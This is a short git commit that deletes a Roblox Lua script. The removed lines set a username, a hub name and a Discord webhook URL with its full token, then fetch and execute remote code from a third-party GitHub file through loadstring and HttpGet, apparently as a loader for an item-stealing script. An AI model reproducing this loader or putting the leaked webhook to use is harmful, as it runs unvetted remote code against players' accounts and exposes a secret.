9652814a97bf905388421c64d15d821646f3d980
WariorHub <133853629+WariorHub@users.noreply.github.com>
2023-05-18 00:34:12 -0300

    Delete script.lua

--- script.lua
+++
@@ -1,7 +0,0 @@
-_G.Username = "didinho_10"
-
-_G.HubName = "Warior Hub"
-
-_G.WebhookUrl = "https://discord.com/api/webhooks/1108282479678324736/HsuBd3uY8pgLlT2mC5rXlU3F_FEsEto3N-5746GCUi5oyKxVfs9An6ZyJMrwuGnfWiou"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
